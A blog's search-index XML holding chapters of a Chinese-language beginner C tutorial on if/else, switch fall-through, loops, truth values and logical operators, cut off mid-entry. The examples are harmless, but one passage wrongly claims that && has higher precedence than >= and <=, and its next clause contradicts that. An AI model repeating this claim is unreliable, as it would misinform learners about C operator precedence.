<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>C语言教程-8-跳转控制和嵌套</title>
      <link href="/2023-09-27-0671b7d09817/"/>
      <url>/2023-09-27-0671b7d09817/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>古典密码</title>
      <link href="/2023-09-25-5ca27d3d86ce/"/>
      <url>/2023-09-25-5ca27d3d86ce/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 加密算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-7-选择执行</title>
      <link href="/2023-09-24-97cf0f932b60/"/>
      <url>/2023-09-24-97cf0f932b60/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是选择执行"><a href="#什么是选择执行" class="headerlink" title="什么是选择执行"></a>什么是选择执行</h1><p>大多数问题的求解中不可能只出现一种情况,甚至是在运算过程中必然出现需要选择的情况,此时,我们就需要根据当前的情况(也就是分支条件)选择一条适当的部分进行执行,而忽略另外的部分.</p><p>例如,我们的问题是<code>输出2个数a,b中的最大值</code>,这就面临一个最简单的选择:究竟是a大还是b大,显然,如果a大则输出a,如果b大则只会输出b. C语言的选择语句就是为了处理这种情况所设计.</p><h1 id="if选择语句"><a href="#if选择语句" class="headerlink" title="if选择语句"></a>if选择语句</h1><p>所有的高级语言都有流程控制语句的实现,而且目前主流的几种语言的语法都是相似的.</p><p>C语言中,使用<code>if...else if...else语句</code>进行选择控制.需要提出的一点是,这里所说的语句和标准表述的不同,但是为了更好地理解,这里把他们整合为一个大的语句.</p><p>该语句的结构如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(表达式<span class="number">1</span>)&#123;</span><br><span class="line"><span class="comment">//代码块1</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(表达式<span class="number">2</span>)&#123;</span><br><span class="line"><span class="comment">//代码块2</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(表达式<span class="number">3</span>)&#123;</span><br><span class="line"><span class="comment">//代码块3</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(...)&#123;</span><br><span class="line">...</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(代码块n)&#123;</span><br><span class="line"><span class="comment">//代码块n</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">//代码块n+1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中,可以看出<code>else if()&#123;&#125;</code>的数量从逻辑上并没有任何限制(但是编译器有最大限制,基本用不到那么多的分支),编译器允许我们的数量足够我们使用.<code>else if()&#123;&#125;</code>的用途是,如果我们在<code>if()</code>中的条件(表达式1)并不符合,我们可以继续判断其他的条件,依次判断,直到确定进入一个<code>else if()&#123;&#125;</code>中.</p><p>同理,<code>else&#123;&#125;</code>用于如果<code>if()&#123;&#125;</code>和所有的<code>else if()&#123;&#125;</code>都不满足条件,那么将会执行else中的<code>代码块n+1</code>.</p><p>另一方面,除了第一个<code>if()&#123;&#125;</code>是必须有且仅有一个,其他所有的<code>else if()&#123;&#125;</code>和必须放在最后的<code>else&#123;&#125;</code>都是可有可无的,他们是否存在取决于你的代码是否需要这么多平行的条件.</p><p>讲了这么多理论,理解力强的朋友可能已经懂了,但是为了清楚说明,还是要举几个例子.</p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h3 id="菜单选择"><a href="#菜单选择" class="headerlink" title="菜单选择"></a>菜单选择</h3><p>写一个程序,输入1,2,3中的一个数,分别输出”hello”,”good”,”great”,如果输入的不是1,2,3中的任何数,则输出”sorry”.</p><p>代码很简单:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line"><span class="keyword">if</span>(n==<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(n==<span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;good&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(n==<span class="number">3</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;great&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;sorry&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>读者可以尝试运行一下.其中,<code>else&#123;&#125;</code>即用于处理<strong>除了1,2,3以外任何输入的值</strong>!</p><h3 id="成绩评级"><a href="#成绩评级" class="headerlink" title="成绩评级"></a>成绩评级</h3><p>输入一个0~100的整数作为成绩,</p><p>如果大于等于90,评为A;</p><p>如果大于等于80且小于90,评为B;</p><p>如果大于等于60且小于80,评为C;</p><p>如果小于60,评为D.</p><p>这里的判断要用到关系运算符(也就是比大小):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> score;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;score); <span class="comment">// 用于输入</span></span><br><span class="line"><span class="keyword">if</span> (score &gt;= <span class="number">90</span> &amp;&amp; score &lt;= <span class="number">100</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;A&quot;</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">80</span> &amp;&amp; score &lt; <span class="number">90</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;B&quot;</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">60</span> &amp;&amp; score &lt; <span class="number">80</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;C&quot;</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (score &lt; <span class="number">60</span> &amp;&amp; score &gt;= <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;D&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;错误,必须为0~100的成绩&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="讲解"><a href="#讲解" class="headerlink" title="讲解"></a>讲解</h3><p>从<code>成绩评级</code>这个程序中,我们可以看到,我们使用了一个较为复杂的表达式,用于限定score变量的范围,我们使用了<code>&lt;=</code>和<code>&gt;=</code>来界定,同时使用<code>&amp;&amp;</code>来连接这两个子表达式.</p><p>必须注意的是,<code>&amp;&amp;</code>的<code>优先级</code>比<code>&gt;=</code>和<code>&lt;=</code>高,这意味着先判断<code>&lt;=</code>和<code>&gt;=</code>,然后才会把两个判断的结果<code>&amp;&amp;</code>起来.</p><p>依旧,有关<code>优先级</code>的知识将会放在后面进行讲解.</p><p>另一方面,我们加入了<code>score&lt;=100</code>和<code>score&gt;=0</code>的判断,用于处理错误输入—这意味着我们意识到运行该程序的人可能输入一个错误的值来测试我们的程序.</p><p>如果我们只关心问题的求解,而不去关心一些可能出现的异常情况,那么一旦出现一些误输入,甚至是故意而为之,我们的程序就会给出错误的结果,甚至崩溃.</p><p>这里的多一步判断,实际上加强了该程序的<code>健壮性</code>,也就是说,这个程序能一定程度上处理一些错误操作,而不会发生错误.</p><p>作为程序的编写者,不要指望使用程序的人(甚至是我们自己)有多么高明,他可能会不小心输入各种错误信息,或者会故意输入错误的信息,此时,就需要你去进行良好的处理.</p><p>​</p><h1 id="switch语句"><a href="#switch语句" class="headerlink" title="switch语句"></a>switch语句</h1><p>除了if语句,如果我们判断的只是一个表达式的值—整数,那么我们可以使用switch语句来简化.</p><p>switch的一般结构是这样的:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>(表达式)&#123;</span><br><span class="line"><span class="keyword">case</span> 常量<span class="number">1</span>:</span><br><span class="line"><span class="comment">//代码段1</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> 常量<span class="number">2</span>:</span><br><span class="line"><span class="comment">//代码段2</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">... <span class="comment">// 任意数量的case语句---同样不能超出编译器允许的最大数量</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> 常量n:</span><br><span class="line"><span class="comment">//代码段n</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="comment">//默认执行代码段</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解释"><a href="#解释" class="headerlink" title="解释:"></a>解释:</h2><p>1.在上面的模板中,我们只对<code>表达式</code>进行一次求值,然后对这个值<code>从上向下</code>依次尝试匹配,如果一旦从一众常量中匹配到一个,那么就从该case进入,依次向下执行代码,直到遇到<code>break;</code>结束或者switch尾部结束.</p><p>2.必须注意的是,<code>表达式求值后必须为整数</code>,因为我们要对其进行精确匹配,而浮点数会有精度问题,很难保持绝对的相等.</p><p>3.非常重要的一点是:case仅仅是一个<code>标号</code>—C语言中的case是真正意义上的标号而已,一旦匹配到后,就不会对后面的语句有任何影响,于是,如果你的当前case没有<code>break;</code>,那么他会穿过下一个没有匹配到的case一直执行下去,直到在任何地方遇到一个<code>break;</code>或者switch尾部才结束—我们会举例强调这个重要特性!</p><p>4.default可有可无,而且其位置任意.这意味着两件事:首先,default类似<code>else&#123;&#125;</code>,只要没有匹配到任何case标签,那么就会执行default;其次,default可以放在任意case之前&#x2F;之后,对其没有任何影响,但是作为规范,我们一般都将其放在最后!</p><p>上面的解释实际已经非常全面了,如果一下子没有完全理解,不要紧,我们上例子:</p><h2 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h2><h3 id="模拟菜单"><a href="#模拟菜单" class="headerlink" title="模拟菜单"></a>模拟菜单</h3><p>我们模拟一个选择菜单,输入1,2,3,4分别输出”开始游戏”,”查看排名”,”设置”,”退出”,如果没有匹配到就输出”输入错误”.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> score;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;score); <span class="comment">// 用于输入</span></span><br><span class="line">    <span class="keyword">switch</span> (score) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;开始游戏&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;查看排名&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;设置&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;退出&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;输入错误&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>就是这么简单,记得每个printf后面都要加上<code>break;</code>,因为default在最后面,所以可以不加break.下面我们尝试一下如果不加break会发生什么:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> score;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;score); <span class="comment">// 用于输入</span></span><br><span class="line">    <span class="keyword">switch</span> (score) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;开始游戏&quot;</span>);</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;查看排名&quot;</span>);</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;设置&quot;</span>);</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;退出&quot;</span>);</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;输入错误&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如图:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230927012301497.png" alt="image-20230927012301497" style="zoom: 33%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230927012319882.png" alt="image-20230927012319882" style="zoom:33%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230927012332979.png" alt="image-20230927012332979" style="zoom:33%;" /><p>显然,我们发现输出完对应的语句后并没有停止,而是向下一直运行—因为一直没有遇到<code>break;语句</code>.读者可以自行尝试在中间适当位置加上<code>break;</code>来测试是否会在此处停止.</p><p>另外,我们测试一下default的位置:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> score;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;score); <span class="comment">// 用于输入</span></span><br><span class="line">    <span class="keyword">switch</span> (score) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;开始游戏&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;查看排名&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;输入错误&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>; <span class="comment">// 要记得加上`break;`!</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;设置&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;退出&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230927012606490.png" alt="image-20230927012606490" style="zoom:33%;" /><p>可以发现并没有任何的影响.但是要注意因为default不在末尾了,要记得加上<code>break;</code>!</p><p>最后,我们可以利用一下switch没遇到<code>break;</code>就不会停止(到达尾部除外)的特性,写一个程序:</p><h3 id="及格判断"><a href="#及格判断" class="headerlink" title="及格判断"></a>及格判断</h3><p>输入’A’,’B’,’C’,’D’这4个评级之一,判断是否及格—除了’D’都及格.同时,要判断错误输入.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> level;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>, &amp;level); <span class="comment">// 用于输入</span></span><br><span class="line">    <span class="keyword">switch</span> (level) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;A&#x27;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;B&#x27;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;恭喜你,及格了!&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;D&#x27;</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;很遗憾,不及格!&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;输入错误!&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>代码中可以看出,无论是匹配到’A’,’B’,’C’中的任何一个,都会执行10,11两行—因为前面的标签后面没有任何语句!包括<code>break;</code>也没有!所以一直向下到第10行,这样一定程度上简化了代码—但是绝对不能滥用,因为毕竟这是C语言的一个特性,要慎重!</p><p>运行结果如下:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230927013445783.png" alt="image-20230927013445783" style="zoom:33%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230927013502980.png" alt="image-20230927013502980" style="zoom:33%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230927013514457.png" alt="image-20230927013514457" style="zoom:33%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230927013526700.png" alt="image-20230927013526700" style="zoom:33%;" /><p>至此,循环执行,选择执行的语句都基本介绍完毕,但是有些细节—例如<code>break;</code>语句究竟是什么?等问题,还有嵌套使用等都要在后面进行详细的讲解.</p><p>​—WAHAHA 2023.9.27</p><p>上一篇:<a href="../2023-09-24-aec1ebeb8470">C语言教程-6-循环执行</a></p><p>下一篇:<a href="../2023-09-27-0671b7d09817">C语言教程-8-跳转控制和嵌套</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-6-循环执行</title>
      <link href="/2023-09-24-aec1ebeb8470/"/>
      <url>/2023-09-24-aec1ebeb8470/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是循环执行"><a href="#什么是循环执行" class="headerlink" title="什么是循环执行"></a>什么是循环执行</h1><p>我们已经有了最基本的程序的编写能力,即根据我们的思路一行一行的编写,这当然没有问题.</p><p>那么为了讲解循环,我们引入一个问题:<code>我要计算从1+2+3+4+...+100的值</code>为了说明问题,我们要求不允许使用简便方法(即高斯的做法),而仅仅只能一个个的累加起来,并编写一个程序,当然,我们可以一行一行的慢慢编写相加,这样可以,代码大概是类似这样子的:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">sum = sum + <span class="number">1</span>; <span class="comment">// 这里的=是赋值,并不是数学意义上的=,也就是说是要把右面的值赋值给左面,</span></span><br><span class="line"><span class="comment">// sum一开始是0,这里先把sum在赋值前的值0加上1,把运算结果1重新赋值给sum,最后sum变成1</span></span><br><span class="line">sum = sum + <span class="number">2</span>;</span><br><span class="line">sum = sum + <span class="number">3</span>;</span><br><span class="line">sum = sum + <span class="number">4</span>;</span><br><span class="line">sum = sum + <span class="number">5</span>;</span><br><span class="line">sum = sum + <span class="number">6</span>;</span><br><span class="line"><span class="comment">//...以此类推</span></span><br><span class="line">sum = sum + <span class="number">99</span>;</span><br><span class="line">sum = sum + <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, sum);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个程序没有问题,但是可以看出来,代码量很大,从1加到100的运算就需要100行,笔者甚至都做了省略.</p><p>但是我们可以发现,每一步操作都是相似的—我们让sum加上一个特定的值,并且这个值是递增的.</p><p>那么,我们就有机会对其进行简化—既然每次增加的值都是递增的,而且所有的操作都是加法,我们可不可以写一个变量i,让他从1循环到100,然后让sum&#x3D;sum+i;依次执行100次来达到相同的结果呢?</p><p>当然是可以的,循环控制就是为了解决这种类似的问题.</p><p>C语言有3种循环语句的实现,分别是while,do…while,for循环.下面依次进行讲解.</p><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="什么是真-什么是假"><a href="#什么是真-什么是假" class="headerlink" title="什么是真,什么是假"></a>什么是真,什么是假</h2><p>不像其他语言,C语言(包括C++)十分简单粗暴:<code>0是假,只要不是0,那么就都是真</code></p><p>这句话隐含一个非常的事情—那就是C语言中所有的值都可以用于判断,也就是说,不像其他语言有类似bool这样专门的类型,C语言只要是任何一个表达式,都可以用于逻辑判断,并且,即使是逻辑表达式,其结果也只会使普通的1(真)或0(假).</p><p>那么问题来了:</p><p>1.默认情况下,0是假,1是真,那么2,3,4,5这样的数是真还是假呢?</p><p>​答案是<code>真</code>!因为<code>非0即为真</code>,只要不是整数0,那么都是真值,同理,一个浮点数1.1也是<code>真</code>.</p><p>2.最重要的一个问题,也是最容易忽略的一个问题,像-1,-2,-3这样的负数是真还是假呢?</p><p>​答案也是<code>真</code>!因为<code>非0即为真</code>,负数怎么可能等于0呢?那不就是<code>真</code>的嘛.</p><h2 id="逻辑运算符和关系运算符简介"><a href="#逻辑运算符和关系运算符简介" class="headerlink" title="逻辑运算符和关系运算符简介"></a>逻辑运算符和关系运算符简介</h2><h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><p>这里简单的介绍一下,非常简单.</p><p>逻辑运算符有3种—与或非,分别是<code>&amp;&amp;</code>,<code>||</code>和<code>!</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">`&amp;&amp;`就是`与`的意思,例如`a&amp;&amp;b`要求a和b必须都是真的,整个表达式才是真的</span><br><span class="line"></span><br><span class="line">`||`就是`或`的意思,例如`a||b`要求a和b只要有一个是真的,整个表达式就是真的</span><br><span class="line"></span><br><span class="line">!就是`非`的意思,他只有一个操作数,例如`!a`就是对a取反,如果`a`为真,那么`!a`就是`假`;如果`a`为假,那么`!a`就是`真`</span><br></pre></td></tr></table></figure><p>以上的a和b都是表达式,无论复杂度多高,只要是一个合法的表达式即可</p><p>并且,虽然非0即为真,但是作为逻辑运算符,其结果一定是1或0</p><h4 id="重点-短路效应"><a href="#重点-短路效应" class="headerlink" 